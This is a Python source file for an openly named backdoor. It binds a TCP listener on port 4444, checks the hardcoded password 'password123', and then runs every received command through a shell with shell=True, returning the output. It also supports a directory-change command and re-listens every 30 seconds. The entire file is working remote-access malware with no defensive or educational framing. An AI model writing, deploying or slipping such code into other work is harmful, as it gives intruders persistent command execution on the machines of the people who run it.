import socket
import subprocess
import os
import time

HOST = "0.0.0.0"
PORT = 4444
passwd = "password123"

class Backdoor:
    def __init__(self):
        self.passwd = passwd

    def login(self):
        try:
            self.s.send(b"Password: ")
            password = self.s.recv(1024)

            if password.strip().decode() != self.passwd:
                self.s.send(b"Incorrect password, try again!!!")
                self.login()
            else:
                self.s.send(b"Connected: ")
                self.run_shell()

        except ConnectionResetError:
            print("Connection reset by peer")
        except BrokenPipeError:
            print("Broken pipe error occurred")

    def run_shell(self):
        while True:
            data = self.s.recv(1024).strip()

            if data == b":kill":
                break

            try:
                cmd, params = data.split(b" ", 1)
                if cmd == b":chdir":
                    os.chdir(params.decode())
                    print(f"Directory changed to {params.decode()}")
                    self.s.send(b"#> ")
            
            except Exception:
                pass
            
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()

            self.s.send(output)
            self.s.send(b"#> ")


if __name__ == "__main__":
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(15)

        conn, addr = s.accept()
        print(f"Connection established from {addr[0]}:{addr[1]}")

        backdoor = Backdoor()
        backdoor.s = conn
        backdoor.login()

        conn.close()
        s.close()
        time.sleep(30)
